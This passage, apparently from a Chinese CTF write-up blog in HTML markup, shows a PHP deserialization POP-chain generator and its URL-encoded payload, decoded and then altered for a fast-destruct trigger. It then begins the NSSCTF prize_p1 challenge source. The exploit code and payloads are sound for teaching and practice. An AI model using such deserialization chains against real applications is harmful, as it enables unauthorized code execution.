punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$this</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$func</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"Me\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$args</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">third</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$string</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$string</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword type-declaration\">string</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$string</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$var</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$var</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">one</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token keyword type-declaration\">object</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">second</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token keyword type-declaration\">object</span><span class=\"token operator\">-></span><span class=\"token property\">filename</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">one</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">-></span><span class=\"token keyword type-declaration\">object</span><span class=\"token operator\">-></span><span class=\"token property\">filename</span><span class=\"token operator\">-></span><span class=\"token keyword type-declaration\">object</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">third</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"string\"</span><span class=\"token operator\">=></span><span class=\"token punctuation\">[</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">one</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"MeMeMe\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>得到payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">a<span class=\"token operator\">%</span><span class=\"token number\">3</span>A2<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">7</span>Bi<span class=\"token operator\">%</span><span class=\"token number\">3</span>A0<span class=\"token operator\">%</span><span class=\"token number\">3</span>BO<span class=\"token operator\">%</span><span class=\"token number\">3</span>A3<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>one<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>A2<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">7</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A9<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>year_parm<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>Ba<span class=\"token operator\">%</span><span class=\"token number\">3</span>A1<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">7</span>Bi<span class=\"token operator\">%</span><span class=\"token number\">3</span>A0<span class=\"token operator\">%</span><span class=\"token number\">3</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A10<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>Happy_func<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">7</span>Ds<span class=\"token operator\">%</span><span class=\"token number\">3</span>A6<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>object<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>BO<span class=\"token operator\">%</span><span class=\"token number\">3</span>A6<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>second<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>A1<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">7</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A8<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>filename<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>BO<span class=\"token operator\">%</span><span class=\"token number\">3</span>A3<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>one<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>A2<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">7</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A9<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>year_parm<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>Ba<span class=\"token operator\">%</span><span class=\"token number\">3</span>A1<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">7</span>Bi<span class=\"token operator\">%</span><span class=\"token number\">3</span>A0<span class=\"token operator\">%</span><span class=\"token number\">3</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A10<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>Happy_func<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">7</span>Ds<span class=\"token operator\">%</span><span class=\"token number\">3</span>A6<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>object<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>BO<span class=\"token operator\">%</span><span class=\"token number\">3</span>A5<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>third<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>A1<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">7</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A13<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">00</span>third<span class=\"token operator\">%</span><span class=\"token number\">00</span>string<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>Ba<span class=\"token operator\">%</span><span class=\"token number\">3</span>A1<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">7</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A6<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>string<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>Ba<span class=\"token operator\">%</span><span class=\"token number\">3</span>A2<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">7</span>Bi<span class=\"token operator\">%</span><span class=\"token number\">3</span>A0<span class=\"token operator\">%</span><span class=\"token number\">3</span>BO<span class=\"token operator\">%</span><span class=\"token number\">3</span>A3<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>one<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>A2<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">7</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A9<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>year_parm<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>Ba<span class=\"token operator\">%</span><span class=\"token number\">3</span>A1<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">7</span>Bi<span class=\"token operator\">%</span><span class=\"token number\">3</span>A0<span class=\"token operator\">%</span><span class=\"token number\">3</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A10<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>Happy_func<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">7</span>Ds<span class=\"token operator\">%</span><span class=\"token number\">3</span>A6<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>object<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>BN<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">7</span>Di<span class=\"token operator\">%</span><span class=\"token number\">3</span>A1<span class=\"token operator\">%</span><span class=\"token number\">3</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A6<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>MeMeMe<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">7</span>D<span class=\"token operator\">%</span><span class=\"token number\">7</span>D<span class=\"token operator\">%</span><span class=\"token number\">7</span>D<span class=\"token operator\">%</span><span class=\"token number\">7</span>D<span class=\"token operator\">%</span><span class=\"token number\">7</span>D<span class=\"token operator\">%</span><span class=\"token number\">7</span>Di<span class=\"token operator\">%</span><span class=\"token number\">3</span>A1<span class=\"token operator\">%</span><span class=\"token number\">3</span>BN<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">7</span>D<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>接下来解码一下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">a<span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"one\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">9</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"year_parm\"</span><span class=\"token punctuation\">;</span>a<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">10</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Happy_func\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"object\"</span><span class=\"token punctuation\">;</span><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"second\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"filename\"</span><span class=\"token punctuation\">;</span><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"one\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">9</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"year_parm\"</span><span class=\"token punctuation\">;</span>a<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">10</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Happy_func\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"object\"</span><span class=\"token punctuation\">;</span><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"third\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">13</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"thirdstring\"</span><span class=\"token punctuation\">;</span>a<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"string\"</span><span class=\"token punctuation\">;</span>a<span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token constant\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"one\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">9</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"year_parm\"</span><span class=\"token punctuation\">;</span>a<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">:</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">10</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Happy_func\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"object\"</span><span class=\"token punctuation\">;</span><span class=\"token constant\">N</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span>i<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>s<span class=\"token punctuation\">:</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"MeMeMe\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span>i<span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span><span class=\"token constant\">N</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>修改<code>i:1</code>为<code>i:0</code>再进行URL编码，得到最终payload</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">a<span class=\"token operator\">%</span><span class=\"token number\">3</span>A2<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">7</span>Bi<span class=\"token operator\">%</span><span class=\"token number\">3</span>A0<span class=\"token operator\">%</span><span class=\"token number\">3</span>BO<span class=\"token operator\">%</span><span class=\"token number\">3</span>A3<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>one<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>A2<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">7</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A9<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>year_parm<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>Ba<span class=\"token operator\">%</span><span class=\"token number\">3</span>A1<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">7</span>Bi<span class=\"token operator\">%</span><span class=\"token number\">3</span>A0<span class=\"token operator\">%</span><span class=\"token number\">3</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A10<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>Happy_func<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">7</span>Ds<span class=\"token operator\">%</span><span class=\"token number\">3</span>A6<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>object<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>BO<span class=\"token operator\">%</span><span class=\"token number\">3</span>A6<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>second<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>A1<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">7</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A8<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>filename<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>BO<span class=\"token operator\">%</span><span class=\"token number\">3</span>A3<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>one<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>A2<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">7</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A9<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>year_parm<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>Ba<span class=\"token operator\">%</span><span class=\"token number\">3</span>A1<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">7</span>Bi<span class=\"token operator\">%</span><span class=\"token number\">3</span>A0<span class=\"token operator\">%</span><span class=\"token number\">3</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A10<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>Happy_func<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">7</span>Ds<span class=\"token operator\">%</span><span class=\"token number\">3</span>A6<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>object<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>BO<span class=\"token operator\">%</span><span class=\"token number\">3</span>A5<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>third<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>A1<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">7</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A13<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">00</span>third<span class=\"token operator\">%</span><span class=\"token number\">00</span>string<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>Ba<span class=\"token operator\">%</span><span class=\"token number\">3</span>A1<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">7</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A6<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>string<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>Ba<span class=\"token operator\">%</span><span class=\"token number\">3</span>A2<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">7</span>Bi<span class=\"token operator\">%</span><span class=\"token number\">3</span>A0<span class=\"token operator\">%</span><span class=\"token number\">3</span>BO<span class=\"token operator\">%</span><span class=\"token number\">3</span>A3<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>one<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>A2<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">7</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A9<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>year_parm<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>Ba<span class=\"token operator\">%</span><span class=\"token number\">3</span>A1<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">7</span>Bi<span class=\"token operator\">%</span><span class=\"token number\">3</span>A0<span class=\"token operator\">%</span><span class=\"token number\">3</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A10<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>Happy_func<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">7</span>Ds<span class=\"token operator\">%</span><span class=\"token number\">3</span>A6<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>object<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>BN<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">7</span>Di<span class=\"token operator\">%</span><span class=\"token number\">3</span>A1<span class=\"token operator\">%</span><span class=\"token number\">3</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A6<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>MeMeMe<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">7</span>D<span class=\"token operator\">%</span><span class=\"token number\">7</span>D<span class=\"token operator\">%</span><span class=\"token number\">7</span>D<span class=\"token operator\">%</span><span class=\"token number\">7</span>D<span class=\"token operator\">%</span><span class=\"token number\">7</span>D<span class=\"token operator\">%</span><span class=\"token number\">7</span>Di<span class=\"token operator\">%</span><span class=\"token number\">3</span>A0<span class=\"token operator\">%</span><span class=\"token number\">3</span>BN<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">7</span>D<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303141459849.png\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"NSSCTF-prize-p1\"><a href=\"#NSSCTF-prize-p1\" class=\"headerlink\" title=\"[NSSCTF]prize_p1\"></a>[NSSCTF]prize_p1</h1><p>题目环境<a href=\"https://www.ctfer.vip/problem/14\">https://www.ctfer.vip/problem/14</a><br>源码如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>META</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Content-Type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html; charset=utf-8<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition 